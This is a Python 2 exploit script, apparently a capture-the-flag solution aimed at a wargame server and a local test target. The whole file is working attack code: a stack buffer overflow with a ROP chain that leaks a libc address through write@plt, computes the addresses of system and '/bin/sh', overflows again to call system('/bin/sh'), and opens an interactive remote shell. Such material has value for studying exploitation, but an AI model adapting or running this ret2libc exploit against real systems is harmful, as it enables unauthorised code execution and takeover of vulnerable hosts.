import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

# main
if sys.argv[1] == "-r":
  s, f = sock("lab33.wargame.whitehat.vn", 10200)
  offset_libc_system = 0x0003fcd0
  offset_libc_binsh = 0x15da84
  offset_libc_start = 0x00019970
if sys.argv[1] == "-l":
  s, f = sock("localhost", 10200)
  offset_libc_system = 0x0003e360
  offset_libc_binsh = 0x15d1a9
  offset_libc_start = 0x00019970

libc_start = 0x804a020
write_plt = 0x080484e0
pop3ret = 0x0804876d

buf = "A"*140
buf += p(write_plt)
buf += p(pop3ret)
buf += p(1)
buf += p(libc_start)
buf += p(4)
buf += p(0x804863d) # retrun to .text

f.write(buf)
read_until(f,"\x01")
libc_start_got = u(f.read(4))
libc_base = libc_start_got - offset_libc_start
system = libc_base + offset_libc_system
binsh = libc_base + offset_libc_binsh
print "libc_start_got",hex(libc_start_got)  
print "system",hex(system)
print "binsh",hex(binsh)

time.sleep(1)
buf = "A"*132
buf += p(system)
buf += p(0xdeadbeef)
buf += p(binsh)

f.write(buf)

shell(s)
